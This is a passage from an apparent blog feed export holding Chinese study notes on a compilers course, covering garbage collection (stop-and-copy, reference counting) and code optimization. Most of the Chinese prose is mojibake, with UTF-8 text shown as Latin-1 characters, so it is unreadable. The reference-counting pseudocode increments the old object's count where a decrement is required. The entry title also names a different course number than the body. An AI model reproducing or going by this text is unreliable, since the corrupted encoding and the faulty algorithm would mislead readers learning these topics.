‡è®°â€”æ¸…é™¤çš„ä¼˜åŠ¿ï¼š</p><ul><li>ç¢ç‰‡åŒ–å†…å­˜ï¼Œæ›´å¤šçš„ä½¿ç”¨å†…å­˜ç¢ç‰‡ï¼Œå‡å°‘ç©ºé—´åˆ©ç”¨ç‡</li><li>å¯¹è±¡åœ¨åƒåœ¾å›æ”¶çš„æ—¶å€™ä¸éœ€è¦ç§»åŠ¨ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”çš„æŒ‡é’ˆä¹Ÿä¸ä¼šå˜åŒ–(è¿™åœ¨ä¸€äº›å…è®¸è‡ªå·±æ‰‹åŠ¨ç®¡ç†å†…å­˜çš„è¯­è¨€å¾ˆé‡è¦ï¼Œå¦‚Cï¼ŒC++ï¼Œä¸ä¼šå¼•èµ·æ­§ä¹‰)</li></ul><h2 id="stop-and-copy">stop and copy</h2><p>å†…å­˜è¢«åˆ’åˆ†ä¸ºä¸¤å—ï¼š</p><ul><li>old space: ç”¨äºåˆ†é…å†…å­˜</li><li>new space: ä¸ºåƒåœ¾å›æ”¶å¤‡ç”¨</li></ul><p>å¦å¤–æœ‰ä¸€ä¸ªheap pointer, æ€»æ˜¯æŒ‡å‘oldspaceçš„ä¸‹ä¸€ä¸ªå¯ç”¨ç©ºé—´ï¼Œæ‰€ä»¥ï¼Œåˆ†é…å†…å­˜ä»…ä»…åœ¨å¢åŠ heap pointer</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520103417917.png"alt="image-20230520103417917" /><figcaption aria-hidden="true">image-20230520103417917</figcaption></figure><p>stop and copyçš„ç‰¹ç‚¹ï¼š</p><ul><li>ä»…ä»…ä»old space copyå¯è¾¾å¯¹è±¡åˆ°newspace(æ‰€ä»¥å½“åƒåœ¾å¾ˆå¤šçš„æ—¶å€™ï¼Œè¿™ç§ç®—æ³•æ•ˆç‡å¾ˆé«˜)</li><li>åƒåœ¾è¢«ç•™åœ¨äº†old space</li><li>åœ¨copyä¹‹åï¼Œnew spaceæ¯”åƒåœ¾å›æ”¶ä¹‹å‰çš„old spaceå ç”¨çš„ç©ºé—´æ›´å°‘</li><li>åœ¨copyç»“æŸä¹‹åï¼Œold spaceå’Œnew spaceäº¤æ¢</li><li>ç”±äºéœ€è¦ç§»åŠ¨scan pointerå’Œallocpointerï¼Œå’Œæ ‡è®°-æ¸…é™¤ä¸€æ ·ï¼Œéœ€è¦çŸ¥é“å¯¹è±¡çš„å¤§å°</li><li>ç”±äºå¯¹è±¡è¢«ç§»åŠ¨äº†ï¼Œå‡½æ•°å †æ ˆé‡Œçš„ç›¸å…³æŒ‡é’ˆå¿…é¡»æ›´æ–°</li></ul><p>æ¯æ¬¡copyä¹‹åï¼Œéœ€è¦æ›´æ–°è¢«copyå¯¹è±¡å†…éƒ¨çš„æŒ‡é’ˆï¼Œå› ä¸ºå…¶æŒ‡å‘åç»­ä¹Ÿä¼šå‘ç”Ÿcopyæ‰å¯¹ï¼Œå¦‚ä½•è®©å…¶æŒ‡é’ˆå¼•ç”¨çš„å¯¹è±¡æŒ‡å‘æœ€æ–°çš„å·²ç»copyçš„å¯¹è±¡ï¼Ÿå¯ä»¥åœ¨æ¯ä¸ªå¯¹è±¡å¢åŠ ä¸€ä¸ªå…³äºè½¬ç§»æŒ‡é’ˆçš„å­—ï¼Œå¦‚æœå¯¹è±¡å‘ç”Ÿäº†copyï¼Œé‚£ä¹ˆè½¬ç§»æŒ‡é’ˆæœ‰å€¼ä¸”æŒ‡å‘æœ€æ–°çš„åœ°å€ï¼Œ</p><blockquote><p>æ€»ç»“ï¼šè½¬ç§»æŒ‡é’ˆå°±æ˜¯å­˜åœ¨äºæ—§å¯¹è±¡é‡ŒæŒ‡å‘æ–°æ‹·è´å¯¹è±¡çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œä½œç”¨æ˜¯æ–¹ä¾¿åç»­å¼•ç”¨è¯¥å¯¹è±¡çš„æŒ‡é’ˆèƒ½å¤Ÿæ ¹æ®è½¬ç§»æŒ‡é’ˆæ­£ç¡®æ›´æ–°ï¼Œå¦å¤–å°±æ˜¯æ ‡è®°æ—§çš„å¯¹è±¡å·²ç»è¢«æ‹·è´äº†</p></blockquote><p>æ‰€ä»¥stop and copyçš„ç›®æ ‡æ˜¯å¯»æ‰¾åˆ°æ‰€æœ‰çš„å¯è¾¾å¯¹è±¡å¹¶copyè‡³newspaceï¼Œå¯¹äºå½“å‰copyå¯¹è±¡ï¼Œè¿˜éœ€è¦æ›´æ–°å…¶å†…éƒ¨çš„æ‰€æœ‰æŒ‡é’ˆ</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520111956200.png"alt="image-20230520111956200" /><figcaption aria-hidden="true">image-20230520111956200</figcaption></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">while</span> scan &lt;&gt; alloc <span class="hljs-keyword">do</span><br><span class="hljs-keyword">let</span> O be the <span class="hljs-type">object</span> at scan pointer<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> pointer p contained <span class="hljs-keyword">in</span> O <span class="hljs-keyword">do</span><br>find O<span class="hljs-comment">&#x27; that p points to</span><br><span class="hljs-keyword">if</span> O<span class="hljs-comment">&#x27; is without a forwarding pointer</span><br>copy O<span class="hljs-comment">&#x27; to new space (update alloc pointer)</span><br><span class="hljs-keyword">set</span> a word <span class="hljs-keyword">of</span> old O<span class="hljs-comment">&#x27; to point the new copy (è¿™ä¸€æ­¥å°±æ˜¯æ ‡è®°æ—§çš„å¯¹è±¡å·²ç»è¢«æ‹·è´äº†)</span><br>change p <span class="hljs-keyword">to</span> point <span class="hljs-keyword">to</span> the <span class="hljs-built_in">new</span> copy <span class="hljs-keyword">of</span> O<span class="hljs-comment">&#x27;</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">set</span> p <span class="hljs-keyword">in</span> O equal <span class="hljs-keyword">to</span> the forwarding pointer<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">for</span><br>increment scan pointer <span class="hljs-keyword">to</span> the <span class="hljs-keyword">next</span> <span class="hljs-type">object</span><br>od<br></code></pre></td></tr></table></figure><p>ä¼˜ç‚¹ï¼š</p><ul><li>ç›¸å¯¹æ¯”è¾ƒå¿«ï¼Œå°¤å…¶åƒåœ¾æ¯”è¾ƒå¤šçš„æ—¶å€™ï¼Œå› ä¸ºåªéœ€è¦å¤„ç†å¯è¾¾å¯¹è±¡</li><li>åˆ†é…å†…å­˜æ˜¯ç®€å•ä¸”å¿«é€Ÿçš„ï¼Œå› ä¸ºåªéœ€è¦å¢åŠ heap pointer</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>ä¸€äº›è¯­è¨€ï¼Œå¦‚Cå’ŒC++ä¸å…è®¸å¯¹è±¡æ‹·è´ï¼Œä»¥åŠæŒ‡é’ˆè½¬ç§»ï¼Œ<strong>å› ä¸ºæŒ‡é’ˆä½œä¸ºå¯¹è±¡è¯­ä¹‰çš„ä¸€éƒ¨åˆ†åœ¨ç¨‹åºä¸­å…¬å¼€</strong></li></ul><p>é’ˆå¯¹Cå’ŒC++ä¸å…è®¸å¯¹è±¡æ‹·è´ï¼Œä»¥åŠæŒ‡é’ˆè½¬ç§»ï¼Œæœ‰ä¸€äº›ConservativecollectionæŠ€æœ¯</p><h2 id="å¼•ç”¨è®¡æ•°">å¼•ç”¨è®¡æ•°</h2><p>åœ¨æ²¡æœ‰è€—å°½å†…å­˜çš„æ—¶å€™å°±å¼€å§‹å¯¹å¯¹è±¡çš„å¼•ç”¨æ•°ï¼ˆæ¯ä¸ªåˆ†é…æ“ä½œéƒ½ä¼šå¼•èµ·å¼•ç”¨è®¡æ•°ï¼‰ï¼Œè¿›è¡Œè®¡æ•°ï¼Œä¸€æ—¦è®¡æ•°ä¸º0ï¼Œè¯´æ˜è¯¥å¯¹è±¡éœ€è¦è¢«å›æ”¶äº†ã€‚</p><p><code>rp(x)ä¸ºxçš„å¼•ç”¨è®¡æ•°</code></p><p>æ¯ä¸ªèµ‹å€¼<code>x &lt;- y</code> ï¼Œè¿™é‡Œå‡è®¾x,yå¯¹è±¡åˆ†åˆ«æŒ‡å‘oå’Œpï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">rc</span><span class="hljs-params">(p)</span></span> &lt;- <span class="hljs-built_in">rc</span>(p) + <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">rc</span><span class="hljs-params">(o)</span></span> &lt;- <span class="hljs-built_in">rc</span>(o) + <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">rc</span>(o) == <span class="hljs-number">0</span>) then free o<br>x &lt;- y<br></code></pre></td></tr></table></figure><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>æ˜“äºå®ç°</li><li>å¢é‡æ”¶é›†åƒåœ¾ï¼Œè€Œä¸ä¼šåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°å¤§é‡çš„åœé¡¿ï¼Œå› ä¸ºå®ƒåœ¨æ²¡æœ‰è€—å°½å†…å­˜çš„æ—¶å€™å°±å¼€å§‹å¯¹å¯¹è±¡çš„å¼•ç”¨æ•°ï¼Œæ¯æ¬¡èµ‹å€¼è¯­å¥éƒ½å¯èƒ½ä¼šå¼•èµ·åƒåœ¾å›æ”¶ï¼Œä½†æ˜¯æ¯æ¬¡çš„åƒåœ¾éƒ½æ˜¯å¢é‡å˜åŒ–çš„ï¼Œå¹¶ä¸ä¼šå æ®å¾ˆå¤šæ—¶é—´ã€‚</li></ul><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>æ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">x -&gt; A <span class="hljs-operator">=</span>&gt; B <span class="hljs-operator">=</span>&gt;A<br><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> null<br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¯­å¥é‡Œï¼Œxæ˜¯ä¸€ä¸ªæŒ‡é’ˆå¼•ç”¨äº†Aï¼Œè€ŒAåˆå¼•ç”¨äº†Bï¼Œå½“xä¸å†æŒ‡å‘Açš„æ—¶å€™ï¼Œç”±äºAå’ŒBçš„å¼•ç”¨è®¡æ•°å§‹ç»ˆä¸ä¸º0ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•å›æ”¶Aå’ŒB</p><ul><li>åœ¨æ¯æ¬¡åˆ†é…æ—¶å¤„ç†å¼•ç”¨è®¡æ•°æœ‰çš„æ—¶å€™æ¯”è¾ƒæ…¢ï¼Œå¦‚æœä¸€ä¸ªèµ‹å€¼ä¸€å¥ç‰µè¿åˆ°äº†å¾ˆå¤šå¯¹è±¡ï¼Œé‚£ä¹ˆå¼•ç”¨è®¡æ•°å°±ä¼šè®¡ç®—è¿™äº›å¯¹è±¡ï¼Œå¯ä»¥åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼˜åŒ–è¿™äº›èµ‹å€¼è¯­å¥ï¼Œæ¯”å¦‚å¦‚æœæœ‰ä¸€ä¸ªå¯¹è±¡çš„ä¸¤æ¬¡æ›´æ–°ï¼Œå¯ä»¥ä¼˜åŒ–æˆä¸€æ¬¡ï¼Œè¿™æ ·å°±ä¼šè®¡ç®—ä¸€æ¬¡å¼•ç”¨è®¡æ•°äº†ã€‚</li></ul><h2 id="æ€»ç»“">æ€»ç»“</h2><p>è‡ªåŠ¨å†…å­˜ç®¡ç†å¯é˜²æ­¢ä¸¥é‡çš„å­˜å‚¨é”™è¯¯</p><p>Butï¼Œä¹Ÿå‡å°‘äº†ç¨‹åºå‘˜å¯¹å†…å­˜çš„æ§åˆ¶ï¼š</p><ul><li>ä¾‹å¦‚ï¼Œå†…å­˜ä¸­çš„æ•°æ®å¸ƒå±€</li><li>ä¾‹å¦‚ï¼Œä½•æ—¶é‡æ–°åˆ†é…å†…å­˜</li></ul><p>å¸¸è§çš„è‡ªåŠ¨å†…å­˜ç®¡ç†é—®é¢˜ï¼š</p><ul><li>å®æ—¶åº”ç”¨é‡Œå¯èƒ½ç”±äºåƒåœ¾å›æ”¶æ—¶é—´è¿‡é•¿å‡ºç°çŸ­æš‚çš„ç¨‹åºåœæ­¢</li><li>å†…å­˜æ³„æ¼ï¼Œä¸€èˆ¬å¤šæ˜¯ç¨‹åºå‘˜æ²¡æœ‰åŠæ—¶å›æ”¶"é‡"å¯¹è±¡</li></ul><p>æœ‰ä¸€äº›æ›´é«˜çº§çš„åƒåœ¾å›æ”¶ç®—æ³•ï¼š</p><ul><li>concurrent: åƒåœ¾å›æ”¶çš„åŒæ—¶å…è®¸ç¨‹åºè¿è¡Œ</li><li>generationalï¼šä¸ä¼šæ‰«æé•¿æœŸå­˜æ´»å¯¹è±¡ï¼ˆv8é‡Œå°±æœ‰ï¼‰</li><li>real time: å‡å°‘å› ä¸ºåƒåœ¾å›æ”¶å¼•èµ·çš„ç¨‹åºåœæ­¢çš„ä¸‹ç•Œ</li><li>parallel: å…è®¸å¤šä¸ªåƒåœ¾å›æ”¶å™¨åŒæ—¶è¿è¡Œï¼›</li></ul>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 9 Optimization</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B9%9D/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B9%9D/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯æ–¯å¦ç¦cs143ç¼–è¯‘åŸç†çš„ç¬”è®°ï¼Œå†…å®¹å¤§éƒ¨åˆ†æ¥è‡ªäºè¯¾ä»¶å’Œè‡ªå·±çš„ç†è§£ï¼Œç¬”è€…èƒ½åŠ›å’Œç²¾åŠ›æœ‰é™ï¼Œå¦‚æœæœ‰é”™è¯¯æ¬¢è¿æŒ‡å‡º</p><hr /><h2 id="ä¸­é—´ä»£ç ">ä¸­é—´ä»£ç </h2><p>ä»€ä¹ˆæ˜¯ä¸­é—´ä»£ç ï¼Ÿä¸€èˆ¬å¸¸æŒ‡ä»‹äºé«˜çº§è¯­è¨€(æºè¯­è¨€)å’Œä½çº§è¯­è¨€(æ±‡ç¼–è¯­è¨€)çš„ä¸€ç§è¯­è¨€</p><ul><li>Provides an intermediate level of abstraction<ul><li>More details than the source</li><li>Fewer details then the target</li></ul></li></ul><p>source lang =&gt;intermediate lang =&gt; target lang</p><p>intermediate lang = high-level assembly</p><ul><li>uses register names, but has unlimited number</li><li>Uses control structures like assemblly language</li><li>uses opcodes but some are higher level<ul><li>Eg: push translates to serveral assembly instructions</li><li>most opcodes correspond directly to assembly opcodes</li></ul></li></ul><p>æ¯ä¸ªæŒ‡ä»¤éƒ½æ˜¯ä»¥ä¸‹ä¸¤ç§å½¢å¼ä¹‹ä¸€(ä¸‰åœ°å€ç )ï¼š</p><ul><li>x := y op z</li><li>x := op y</li></ul><p>ğŸŒ°ï¼šè¡¨è¾¾å¼ x + y * zå¯ä»¥è½¬æ¢æˆå¦‚ä¸‹ä¸­é—´ä»£ç å½¢å¼(æ¯ä¸€ä¸ªå­è¡¨è¾¾å¼éƒ½æœ‰ä¸€ä¸ª(å¯„å­˜å™¨)åç§°)ï¼š</p><ul><li><p>t1 := y * z</p></li><li><p>t2 := x + t1</p></li></ul><p><strong>æ€»ç»“</strong></p><p>ä¸­é—´ä»£ç çš„å¥½å¤„ï¼šä¸æœºå™¨æ— å…³ï¼Œå¯ä»¥åœ¨ä¸­é—´ä»£ç å®ç°ä¼˜åŒ–ï¼Œæé«˜äº†ç¨‹åºåœ¨ä¸åŒç³»ç»Ÿæ¶æ„ä¹‹é—´è¿ç§»çš„å¯èƒ½æ€§</p><h2 id="ä¼˜åŒ–">ä¼˜åŒ–</h2><p>Optimization is complex and largest phase</p><p>Parsing =&gt; Semantic =&gt; Opt =&gt; Gen</p><p>ä»€ä¹ˆæ—¶å€™åšä¼˜åŒ–ï¼Ÿ</p><ul><li>On AST ?<ul><li>Pro: Machine independent</li><li>Cons: Too high level</li></ul></li><li>On assembly lang ?<ul><li>Pro: Exposes optimization oppotunities</li><li>Cons: Machine dependent</li><li>Cons: Must reimplement optimizations when retargetting</li></ul></li><li>On intermediate lang ?<ul><li>Pro: machine independent</li><li>Pro: Exposes optimization oppotunities</li></ul></li></ul><p><strong>Basic Block:</strong> is a maximal sequence of instructionswith:</p><ul><li>no labels (except at the first instructions), and</li><li>no jumps (except at the last instructions)</li></ul><blockquote><p>å…¶å®å°±æ˜¯æŒ‡ä¸€æ®µé™¤äº†èµ·å§‹å…¥å£å’Œæœ«å°¾è·³è½¬(é€€å‡º)æŒ‡ä»¤æ²¡æœ‰å…¶ä»–è·³è½¬(é€€å‡º)æŒ‡ä»¤çš„ä¸€æ®µæŒ‡ä»¤é›†</p></blockquote><p>A basic block is a single-entry, single-exit, straight-line codesegment</p><blockquote><p>å•ä¸€å…¥å£ï¼Œå•ä¸€å‡ºå£ï¼Œä¸€è¡Œä¸€è¡Œæ‰§è¡Œçš„ç¨‹åºæ®µ</p></blockquote><p><strong>control-flow graph</strong>ï¼šis a directed graph with:</p><ul><li>Basic blocks as nodes</li><li>An edge from block A to block B if the execution can pass from thelast instruction in A to the first instruction in B</li></ul><p>â€‹ eg:</p><ul><li>the last instruction in A is <code>jump LabelB</code></li><li>execution can fall through from block A to block B (åœ¨blockAæ‰§è¡Œå¤±è´¥äº†åè·³è½¬åˆ°äº†block B)</li></ul><p>ä¼˜åŒ–çš„å¥½å¤„ï¼š</p><ul><li>æé«˜æ‰§è¡Œæ—¶é—´</li><li>å‡å°ä»£ç ä½“ç§¯</li><li>å‡å°‘ç½‘ç»œä¼ è¾“é‡</li><li>å‡å°å†…å­˜çš„ä½¿ç”¨</li><li>å‡å°ç¡¬ç›˜çš„ä½¿ç”¨ï¼ˆå­˜å‚¨æ±‡ç¼–ä»£ç æ–‡ä»¶ï¼‰</li><li>å‡å°‘ç¡¬ä»¶ä½¿ç”¨çš„ç”µé‡ (è¿™ä¹Ÿå¯ä»¥ï¼Œ...)</li></ul><p>ä¼˜åŒ–çš„ä¸‰ä¸ªç²’åº¦ï¼š</p><ul><li>local optimizations (å±€éƒ¨ä¼˜åŒ–)<ul><li>Apply to a basic block isolation</li></ul></li><li>global optimizations (å…¨å±€ä¼˜åŒ–)<ul><li>Apply to a control-flow in isolation</li></ul></li><li>Inter-procedural optimizations<ul><li>Apply across method boundaries</li></ul></li></ul><p>å®é™…æƒ…å†µä¸‹ï¼šå¾ˆéš¾å®ç°ä¸€ä¸ªéå¸¸ç†æƒ³åŒ–çš„ä¼˜åŒ–ç®—æ³•</p><ul><li>ä¸ºä»€ä¹ˆï¼Ÿ<ul><li>æŸäº›ä¼˜åŒ–éš¾ä»¥å®ç°</li><li>æŸäº›ä¼˜åŒ–ä¼šèŠ±è´¹å¤§é‡çš„ç¼–è¯‘æ—¶é—´</li><li>ä¸€äº›ä¼˜åŒ–çš„å›æŠ¥å¾ˆä½</li><li>å¾ˆå¤šèŠ±å“¨çš„ä¼˜åŒ–åŒæ—¶æ»¡è¶³è¿™ä¸‰ç‚¹</li></ul></li></ul><h2 id="å±€éƒ¨ä¼˜åŒ–">å±€éƒ¨ä¼˜åŒ–</h2><p>ä¼˜åŒ–åŸºæœ¬blockï¼Œä¸æ¶‰åŠæ•´ä¸ªä»£ç ï¼Œæ¯”è¾ƒç®€å•</p><p><strong>algebra optimization (ä»£æ•°ä¼˜åŒ–)</strong></p><p>æœ‰äº›è¿ç®—å¯ä»¥è¢«å¦ä¸€äº›æ›´å¿«çš„è¿ç®—ä»£æ›¿ï¼š</p><p>x := x * 8 =&gt; x := x &lt;&lt; 3</p><p><strong>Constant foldï¼ˆå¸¸æ•°æŠ˜å ï¼‰</strong></p><p>Operations on constants can be computed at compile time:</p><ul><li>if there is a statement x := y op z</li><li>and y and z constants</li><li>then y op z can be computed at compile time</li></ul><p>Eg: x := 2 + 2 =&gt; x := 4; if 2 &lt; 0 jump L can be deleted</p><p>å¸¸æ•°æŠ˜å ä¹Ÿå¹¶ä¸å®‰å…¨ï¼Œå› ä¸ºä¼šå­˜åœ¨äº¤å‰ç¼–è¯‘çš„æƒ…å†µï¼š</p><p>åœ¨Xæ¶æ„ä¸Šç¼–è¯‘åˆ°æ¶æ„Yä¸Šè¿è¡Œï¼Œç¼–è¯‘åçš„äº§ç‰©åœ¨Xä¸Šè¿è¡Œå’Œåœ¨Yä¸Šè¿è¡Œå¯èƒ½ä¼šäº§ç”Ÿä¸åŒçš„ç»“æœ</p><p>X: a : = 1.2 + 6.9 ç»è¿‡å¸¸æ•°æŠ˜å å=&gt; a := 8.1</p><p>Y: a: = 8</p><p><strong>å•ä¸€èµ‹å€¼å½¢å¼</strong>ï¼šæ¯ä¸€ä¸ªå¯„å­˜å™¨åç§°ä»…ä»…å‡ºç°åœ¨ä¸€æ¬¡åœ¨èµ‹å€¼è¯­å¥çš„å·¦ä¾§</p><p>x := z + b := z + y</p><p>a := x =&gt; a := b</p><p>x := 2 * x x := 2 * b</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µï¼Œå’Œå˜é‡æ´»è·ƒåº¦æœ‰å…³ï¼šSingle assigment form</p><p>åŸºäºè¿™ä¸ªå‡è®¾ï¼šå¦‚æœåŸºæœ¬å—æ˜¯ä»¥å•ä¸€èµ‹å€¼å½¢å¼å‡ºç°çš„ï¼Œå³ <code>x:=</code>æ˜¯åœ¨è¯¥å—å†…ä»…æœ‰çš„ä¸€æ¬¡ä¸ºxèµ‹å€¼</p><p>é‚£ä¹ˆå½“å—å†…å‡ºç°äº†ç›¸åŒçš„å³ä¾§è¡¨è¾¾å¼ï¼Œè¿™ä¸ªè¡¨è¾¾å¼å°±æ˜¯é‡å¤çš„ï¼ˆ<strong>Commonsubexpression elimination</strong>ï¼‰</p><p>ğŸŒ°: è¿™ä¸ªä¾‹å­é‡Œxï¼Œyå’Œzçš„å€¼åœ¨çœç•¥å·é‡Œæ˜¯ä¸ä¼šæ”¹å˜çš„</p><p>x := y + z x := y + z</p><p>... =&gt; ...</p><p>w := y + z w := x</p><p><strong>Copy propagatationï¼ˆæ‹·è´ä¼ æ’­ï¼‰</strong></p><p>å‡è®¾åŸºæœ¬å—æ˜¯ä»¥å•ä¸€èµ‹å€¼å½¢å¼å­˜åœ¨çš„ï¼š</p><p>if w := x appears in a block, replace subsequent uses of w with usesof x</p><p>ğŸŒ°:</p><p>b := z + y b := z + y</p><p>a := b =&gt; a := b</p><p>x := 2 * a x := 2 * b</p><p><strong>Dead code elimination</strong></p><p>ä¸Šé¢çš„<code>a := b</code>å¯¹ä»£ç ç»“æœæ²¡ä»€ä¹ˆæ­å–œï¼Œå¯ä»¥åˆ é™¤</p><p><strong>Unresearchable code delete</strong></p><p>åˆ é™¤ä¸å¯è¾¾ä»£ç ï¼Œå‡å°ä»£ç ä½“ç§¯</p><p>Eg:ä¸å¯èƒ½èµ°çš„æ¡ä»¶åˆ†æ”¯è¯­å¥ï¼›å¯¼å…¥äº†ä¸€ä¸ªåŒ…é‡Œæ‰€æœ‰çš„å·¥å…·ï¼Œä½†æ˜¯æœ‰æ²¡æœ‰ç”¨(æœ‰ç‚¹ç±»ä¼¼treeshaking)</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050404.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ä»£æ•°ä¼˜åŒ–åï¼š</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050407.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>æ‹·è´ä¼ æ’­åï¼š</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050410.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>å¸¸æ•°æŠ˜å ï¼š</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050411.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>å…¬å…±å­è¡¨è¾¾å¼åˆ é™¤ï¼š</p><p>æœ€ç»ˆï¼š</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050416.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="peephole-optimization">Peephole Optimization</h2><h2 id="å…¨å±€ä¼˜åŒ–">å…¨å±€ä¼˜åŒ–</h2><p>ä¸ºäº†åœ¨åŸºæœ¬å—ä¹‹é—´ç”¨å¸¸æ•°kä»£æ›¿å˜é‡xï¼Œç¼–è¯‘å™¨å¿…é¡»çŸ¥é“æ¯æ¡ä½¿ç”¨å˜é‡xè·¯å¾„çš„æœ€åä¸€ä¸ªå…³äºxçš„èµ‹å€¼è¯­å¥<code>x := k</code>ï½ï½</p><p>å¯¹äºå…¨å±€ä¼˜åŒ–ï¼Œå…¨å±€å¸¸é‡ä¼ æ’­åº”è¯¥åœ¨ï½ï½å¤„æ‰§è¡Œ</p><p>æ‰€ä»¥å…¨å±€ä¼˜åŒ–çš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°æ‰€æœ‰çš„ï½ï½</p><p>å®šä¹‰å¦‚ä¸‹å½¢å¼åŒ–ç¬¦å·ï¼š</p><table><thead><tr class="header"><th>value</th><th></th></tr></thead><tbody><tr class="odd"><td>$ $</td><td>This statement never executesï¼ˆè¿˜æ²¡æ‰§è¡Œï¼Œä¸€èˆ¬ç”¨äºåˆå§‹åŒ–ï¼‰</td></tr><tr class="even"><td>$ C $</td><td>X = C (C is constant)</td></tr><tr class="odd"><td>$$</td><td>X is not a constantï¼ˆå·²æ‰§è¡Œï¼Œä½†æ˜¯ä¸ç¡®å®šå…·ä½“å€¼ï¼‰</td></tr></tbody></table><p><strong>å¸¸æ•°æ‹·è´ï¼š</strong>å¸¸æ•°æ‹·è´æ˜¯å¾ˆæœ‰ç”¨çš„å› ä¸ºå®ƒå¯ä»¥ä½¿å¾—ä¸€äº›å˜é‡ç›´æ¥è½¬æ¢æˆå¸¸é‡ï¼Œä»è€Œå‡å°‘å¯„å­˜å™¨çš„ä½¿ç”¨ï¼Œä½†æ˜¯åœ¨æ§åˆ¶å›¾é‡Œï¼Œåˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦å¯ä»¥è¢«æ›¿æ¢æˆå¸¸é‡æ˜¯å›°éš¾çš„</p><p>ä¸€ç§æ€è·¯æ˜¯ä¸€ä¸ªå˜é‡çš„ä¿¡æ¯å’Œå®ƒçš„ä¸Šä¸‹æ–‡æœ‰å…³ï¼ˆå‰åè¯­å¥ï¼‰ <spanclass="math display">\[C(s, x, in) = value \quad of \quad x \quad before \quad s  \quadåœ¨è¯­å¥sä¹‹å‰å˜é‡xçš„ä¿¡æ¯\]</span></p><p><span class="math display">\[C(s, x, out) = value \quad of \quad x \quad after \quad s \quadåœ¨è¯­å¥sä¹‹åå˜é‡xçš„ä¿¡æ¯\]</span></p><p>ç”±äºè¯¾æœ¬ä¸Šçš„è§„åˆ™è¿‡äºå¤æ‚ï¼Œæœ¬äººæ€»ç»“äº†ä»¥ä¸‹è§„åˆ™rulesï¼š</p><ul><li>é’ˆå¯¹æŸä¸ªèŠ‚ç‚¹çš„å…¥åº¦ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š<ol 